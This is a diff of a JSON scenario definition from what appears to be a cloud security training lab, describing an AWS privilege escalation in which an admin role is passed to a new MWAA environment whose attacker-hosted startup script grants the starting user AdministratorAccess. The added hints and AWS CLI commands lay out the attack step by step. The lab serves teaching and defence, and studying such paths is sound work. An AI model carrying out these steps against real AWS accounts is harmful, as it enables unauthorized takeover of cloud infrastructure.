@@ -1,5 +1,5 @@
 {
-  "displayName": "Privilege Escalation via iam:PassRole + airflow:CreateEnvironment",
+  "displayName": "MWAA Environment Creation to Admin",
   "name": "mwaa-001-iam-passrole+airflow-createenvironment",
   "description": "Pass privileged role to MWAA environment with malicious startup script for privilege escalation",
   "costEstimate": "$37/mo",
@@ -31,71 +31,84 @@
     "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/mwaa-001-iam-passrole+airflow-createenvironment"
   },
   "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/mwaa-001-iam-passrole+airflow-createenvironment",
-  "schemaVersion": "3.0.0",
+  "schemaVersion": "4.0.0",
   "permissions": {
     "required": [
       {
         "permission": "iam:PassRole",
+        "principal": "pl-prod-mwaa-001-to-admin-starting-user",
         "resource": "arn:aws:iam::*:role/pl-prod-mwaa-001-to-admin-admin-role",
         "description": "pass the admin execution role to the MWAA service"
       },
       {
         "permission": "airflow:CreateEnvironment",
+        "principal": "pl-prod-mwaa-001-to-admin-starting-user",
         "resource": "*",
         "description": "create an MWAA environment with the admin execution role"
       },
       {
         "permission": "ec2:CreateNetworkInterface",
+        "principal": "pl-prod-mwaa-001-to-admin-starting-user",
         "resource": "*",
         "description": "MWAA validates caller has this permission (SLR does actual work)"
       },
       {
         "permission": "ec2:CreateNetworkInterfacePermission",
+        "principal": "pl-prod-mwaa-001-to-admin-starting-user",
         "resource": "*",
         "description": "MWAA validates caller has this permission"
       },
       {
         "permission": "ec2:DescribeNetworkInterfaces",
+        "principal": "pl-prod-mwaa-001-to-admin-starting-user",
         "resource": "*",
         "description": "MWAA validates caller has this permission"
       },
       {
         "permission": "ec2:DescribeSubnets",
+        "principal": "pl-prod-mwaa-001-to-admin-starting-user",
         "resource": "*",
         "description": "MWAA validates caller has this permission"
       },
       {
         "permission": "ec2:DescribeSecurityGroups",
+        "principal": "pl-prod-mwaa-001-to-admin-starting-user",
         "resource": "*",
         "description": "MWAA validates caller has this permission"
       },
       {
         "permission": "ec2:DescribeVpcs",
+        "principal": "pl-prod-mwaa-001-to-admin-starting-user",
         "resource": "*",
         "description": "MWAA validates caller has this permission"
       },
       {
         "permission": "ec2:CreateVpcEndpoint",
+        "principal": "pl-prod-mwaa-001-to-admin-starting-user",
         "resource": "*",
         "description": "MWAA validates caller has this permission"
       },
       {
         "permission": "ec2:DeleteVpcEndpoints",
+        "principal": "pl-prod-mwaa-001-to-admin-starting-user",
         "resource": "*",
         "description": "MWAA validates caller has this permission"
       },
       {
         "permission": "ec2:DescribeVpcEndpoints",
+        "principal": "pl-prod-mwaa-001-to-admin-starting-user",
         "resource": "*",
         "description": "MWAA validates caller has this permission"
       },
       {
         "permission": "ec2:DescribeVpcEndpointServices",
+        "principal": "pl-prod-mwaa-001-to-admin-starting-user",
         "resource": "*",
         "description": "MWAA validates caller has this permission"
       },
       {
         "permission": "s3:GetEncryptionConfiguration",
+        "principal": "pl-prod-mwaa-001-to-admin-starting-user",
         "resource": "*",
         "description": "MWAA validates caller has this permission"
       }
@@ -103,14 +116,17 @@
     "helpful": [
       {
         "permission": "airflow:GetEnvironment",
+        "principal": "pl-prod-mwaa-001-to-admin-starting-user",
         "purpose": "check environment status and wait for it to be ready"
       },
       {
         "permission": "airflow:DeleteEnvironment",
+        "principal": "pl-prod-mwaa-001-to-admin-starting-user",
         "purpose": "clean up the MWAA environment after the attack"
       },
       {
         "permission": "ec2:DescribeRouteTables",
+        "principal": "pl-prod-mwaa-001-to-admin-starting-user",
         "purpose": "verify subnets have routes to NAT Gateway"
       }
     ]
@@ -136,7 +152,7 @@
       }
     },
     "teardown": {
-      "nonInteractive": "```bash\nplabs disable enable_single_account_privesc_one_hop_to_admin_mwaa_001_iam_passrole_airflow_createenvironment\nplabs apply\n```",
+      "nonInteractive": "```bash\nplabs disable single_account_privesc_one_hop_to_admin_mwaa_001_iam_passrole_airflow_createenvironment\nplabs apply\n```",
       "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
     },
     "defend": {
@@ -187,15 +203,21 @@
         "label": "iam:PassRole + airflow:CreateEnvironment",
         "description": "The attacker creates an MWAA environment, passing the admin execution role via iam:PassRole and specifying a malicious startup script hosted in an attacker-controlled S3 bucket.\n",
         "hints": [
-          "You can create managed workflow environments and pass IAM roles to them.",
-          "MWAA environments run a startup script before Airflow initializes \u2014 with the execution role's permissions.",
-          "Host a malicious startup script in an attacker-controlled S3 bucket and pass an admin role to gain privilege escalation.",
+          "Start by understanding what IAM roles exist and which ones you can pass. Use iam:GetRole to inspect a role's trust policy and see what services it trusts.",
+          "You have airflow:CreateEnvironment -- look at what parameters this API call accepts. Pay special attention to ExecutionRoleArn and StartupScriptS3Path.",
+          "MWAA environments can reference S3 buckets for DAGs and startup scripts. You need a bucket with a dags/ folder and a startup script. Check the Terraform output for a pre-staged attacker bucket.",
+          "The startup script runs before Airflow initializes and executes with the full permissions of the execution role. Think about what AWS CLI commands that role can run.",
+          "You need several EC2 networking permissions alongside airflow:CreateEnvironment -- MWAA validates that the caller has permissions it will need for VPC setup. Check the Terraform output for VPC, subnet, and security group IDs.",
           "Browse to https://pathfinding.cloud/paths/mwaa-001 for technique details."
         ],
         "commands": [
           {
+            "description": "Check which role is available for passing and confirm its trust policy allows airflow.amazonaws.com",
+            "command": "aws iam get-role --role-name pl-prod-mwaa-001-to-admin-admin-role --query 'Role.{Arn:Arn,TrustPolicy:AssumeRolePolicyDocument}' --output json"
+          },
+          {
             "description": "Create the MWAA environment with the admin execution role and malicious startup script",
-            "command": "aws airflow create-environment \\\n  --name pl-prod-mwaa-001-env \\\n  --execution-role-arn arn:aws:iam::{account_id}:role/pl-prod-mwaa-001-to-admin-admin-role \\\n  --source-bucket-arn arn:aws:s3:::attacker-bucket \\\n  --dag-s3-path dags/ \\\n  --network-configuration SubnetIds=subnet-xxx,subnet-yyy,SecurityGroupIds=sg-xxx \\\n  --startup-script-s3-path s3://attacker-bucket/startup.sh\n"
+            "command": "aws mwaa create-environment \\\n  --region \"$AWS_REGION\" \\\n  --name \"pl-mwaa-001-demo-$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 6 | head -n 1)\" \\\n  --execution-role-arn \"arn:aws:iam::{account_id}:role/pl-prod-mwaa-001-to-admin-admin-role\" \\\n  --source-bucket-arn \"arn:aws:s3:::pl-mwaa-001-attacker-bucket-{account_id}-{suffix}\" \\\n  --dag-s3-path \"dags\" \\\n  --startup-script-s3-path \"startup.sh\" \\\n  --network-configuration \"SubnetIds=subnet-xxx,subnet-yyy,SecurityGroupIds=sg-xxx\" \\\n  --environment-class \"mw1.small\" \\\n  --airflow-version \"2.8.1\" \\\n  --webserver-access-mode \"PUBLIC_ONLY\" \\\n  --max-workers 2 \\\n  --min-workers 1\n"
           }
         ]
       },
@@ -205,17 +227,22 @@
         "label": "Startup script execution",
         "description": "When the MWAA environment initializes, the startup script runs with the execution role's credentials and attaches AdministratorAccess to the starting user, completing the privilege escalation.\n",
         "hints": [
-          "MWAA startup scripts run before Airflow initializes and execute as the execution role.",
-          "The startup script can make any AWS API call that the execution role is permitted to make."
+          "MWAA environment creation is asynchronous -- use airflow:GetEnvironment to poll the status. You are waiting for the AVAILABLE state, which takes 20-30 minutes.",
+          "Once the environment reaches AVAILABLE status, the startup script has already run. Check whether AdministratorAccess is now attached to your starting user using iam:ListAttachedUserPolicies.",
+          "If the policy is attached, verify the escalation by attempting an action that requires admin privileges -- for example, listing IAM users with iam:ListUsers."
         ],
         "commands": [
           {
-            "description": "Wait for environment to reach AVAILABLE state (20-30 minutes)",
-            "command": "aws airflow get-environment --name pl-prod-mwaa-001-env \\\n  --query 'Environment.Status'\n"
+            "description": "Poll until the environment reaches AVAILABLE status (checks every 60 seconds)",
+            "command": "while true; do\n  STATUS=$(aws mwaa get-environment \\\n    --region \"$AWS_REGION\" \\\n    --name \"$ENVIRONMENT_NAME\" \\\n    --query 'Environment.Status' \\\n    --output text)\n  echo \"Status: $STATUS\"\n  [ \"$STATUS\" = \"AVAILABLE\" ] && break\n  sleep 60\ndone\n"
           },
           {
-            "description": "Verify admin access after startup script executes",
-            "command": "aws iam list-users --max-items 1"
+            "description": "Verify AdministratorAccess is attached to the starting user",
+            "command": "aws iam list-attached-user-policies --user-name pl-prod-mwaa-001-to-admin-starting-user --query 'AttachedPolicies[*].PolicyArn' --output text"
+          },
+          {
+            "description": "Confirm admin access by listing IAM users",
+            "command": "aws iam list-users --max-items 3 --output table"
           }
         ]
       }
